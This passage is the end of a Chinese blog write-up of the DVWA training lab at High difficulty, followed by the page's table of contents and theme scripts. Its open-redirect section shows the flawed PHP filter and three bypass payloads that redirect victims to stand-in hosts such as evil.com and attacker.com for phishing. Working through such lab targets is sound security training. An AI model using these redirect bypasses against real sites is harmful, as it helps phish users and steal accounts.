+<li>发送请求后，返回<code>&#123;&quot;result&quot;:&quot;ok&quot;&#125;</code>，用户信息修改成功。<br><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174102999.png"></li>
+</ol>
+<hr>
+<h2 id="16-Open-HTTP-Redirect-—-开放重定向"><a href="#16-Open-HTTP-Redirect-—-开放重定向" class="headerlink" title="16. Open HTTP Redirect — 开放重定向"></a>16. Open HTTP Redirect — 开放重定向</h2><h3 id="漏洞特点-14"><a href="#漏洞特点-14" class="headerlink" title="漏洞特点"></a>漏洞特点</h3><p>High 难度对<code>redirect</code>参数做了<strong>关键字匹配过滤</strong>（仅允许包含<code>info.php</code>），但未限制<code>info.php</code>的位置，可构造包含<code>info.php</code>的恶意URL，实现任意地址重定向。</p>
+<h3 id="漏洞代码分析-8"><a href="#漏洞代码分析-8" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;redirect&quot;</span>,<span class="variable">$_GET</span>) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>]!=<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>],<span class="string">&quot;info.php&quot;</span>)==<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">http_response_code</span>(<span class="number">500</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;You can only redirect to the info page.&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 重定向逻辑</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;redirect&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/20260303174119561.png"></p>
+<h3 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h3><p>构造<strong>包含info.php的恶意URL</strong>，绕过滤后将受害者重定向到钓鱼网站&#x2F;恶意站点，核心Payload示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Payload1：参数后拼接info.php</span><br><span class="line">?redirect=https://evil.com/?x=info.php</span><br><span class="line"># Payload2：子域名中包含info.php</span><br><span class="line">?redirect=https://evil.com/info.php.attacker.com/</span><br><span class="line"># Payload3：锚点后拼接info.php</span><br><span class="line">?redirect=https://attacker.com#info.php</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者诱导受害者点击恶意链接，受害者在信任的dvwa域名下被重定向到恶意站点，导致钓鱼、账号窃取等攻击。</p>
+<hr>
+<h2 id="17-Cryptography-—-密码学"><a href="#17-Cryptography-—-密码学" class="headerlink" title="17. Cryptography — 密码学"></a>17. Cryptography — 密码学</h2><hr>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/190bc696/">DVWA Weak Session IDs High 难度踩坑记录</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/31fdd992/">Pikachu 靶场通关笔记</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA-%E9%9D%B6%E5%9C%BA%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A-High-Level"><span class="toc-text">DVWA 靶场实验报告 (High Level)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%91-%E7%9B%AE%E5%BD%95"><span class="toc-text">📑 目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Brute-Force-%E2%80%94-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">1. Brute Force — 暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-text">利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-text">核心注意点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Command-Injection-%E2%80%94-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-text">2. Command Injection — 命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-1"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-CSRF-%E2%80%94-%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-text">3. CSRF — 跨站请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-2"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-text">攻击思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-File-Inclusion-%E2%80%94-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">4. File Inclusion — 文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-3"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E5%88%A9%E7%94%A8"><span class="toc-text">拓展利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-File-Upload-%E2%80%94-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">5. File Upload — 文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-4"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4-1"><span class="toc-text">利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%B3%A8%E6%84%8F%E7%82%B9-1"><span class="toc-text">核心注意点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Insecure-CAPTCHA-%E2%80%94-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-text">6. Insecure CAPTCHA — 不安全的验证码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-SQL-Injection-%E2%80%94-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-text">7. SQL Injection — SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-5"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%88%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">利用步骤（手工注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%88Sqlmap%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="toc-text">利用步骤（Sqlmap自动化注入）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-SQL-Injection-Blind-%E2%80%94-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-text">8. SQL Injection (Blind) — SQL 盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-6"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%88Sqlmap%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-text">利用步骤（Sqlmap自动化布尔盲注）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%B3%A8%E6%84%8F%E7%82%B9-2"><span class="toc-text">核心注意点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Weak-Session-IDs-%E2%80%94-%E5%BC%B1%E4%BC%9A%E8%AF%9D-ID"><span class="toc-text">9. Weak Session IDs — 弱会话 ID</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-7"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4-2"><span class="toc-text">利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3"><span class="toc-text">漏洞危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10-XSS-DOM-%E2%80%94-DOM-%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-text">10. XSS (DOM) — DOM 型跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-8"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-4"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#11-XSS-Reflected-%E2%80%94-%E5%8F%8D%E5%B0%84%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-text">11. XSS (Reflected) — 反射型跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-9"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-5"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3"><span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%93%E5%B1%95Payload"><span class="toc-text">拓展Payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-XSS-Stored-%E2%80%94-%E5%AD%98%E5%82%A8%E5%9E%8B%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC"><span class="toc-text">12. XSS (Stored) — 存储型跨站脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-10"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-6"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4-3"><span class="toc-text">利用步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-CSP-Bypass-%E2%80%94-CSP-%E7%BB%95%E8%BF%87"><span class="toc-text">13. CSP Bypass — CSP 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-11"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4"><span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-text">操作步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-JavaScript-Attacks-%E2%80%94-JavaScript-%E6%94%BB%E5%87%BB"><span class="toc-text">14. JavaScript Attacks — JavaScript 攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-12"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E9%80%BB%E8%BE%91%E5%88%86%E6%9E%90"><span class="toc-text">加密逻辑分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E6%B7%B7%E6%B7%86%E5%90%8E%E6%A0%B8%E5%BF%83JS%E4%BB%A3%E7%A0%81"><span class="toc-text">反混淆后核心JS代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%EF%BC%88%E4%B8%A4%E7%A7%8D%EF%BC%89"><span class="toc-text">利用方法（两种）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E5%89%8D%E7%AB%AF%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%89%8B%E5%8A%A8%E6%89%A7%E8%A1%8C%E5%8A%A0%E5%AF%86%E5%87%BD%E6%95%B0"><span class="toc-text">方法1：前端控制台手动执行加密函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9APython%E8%84%9A%E6%9C%AC%E8%BF%98%E5%8E%9F%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B%EF%BC%8C%E7%9B%B4%E6%8E%A5%E7%94%9F%E6%88%90token"><span class="toc-text">方法2：Python脚本还原加密过程，直接生成token</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Python%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC"><span class="toc-text">Python加密脚本</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC"><span class="toc-text">执行脚本</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-Authorisation-Bypass-%E2%80%94-%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-text">15. Authorisation Bypass — 越权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-13"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-7"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5"><span class="toc-text">利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-Open-HTTP-Redirect-%E2%80%94-%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-text">16. Open HTTP Redirect — 开放重定向</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%B9%E7%82%B9-14"><span class="toc-text">漏洞特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-8"><span class="toc-text">漏洞代码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6"><span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3-1"><span class="toc-text">漏洞危害</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-Cryptography-%E2%80%94-%E5%AF%86%E7%A0%81%E5%AD%A6"><span class="toc-text">17. Cryptography — 密码学</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
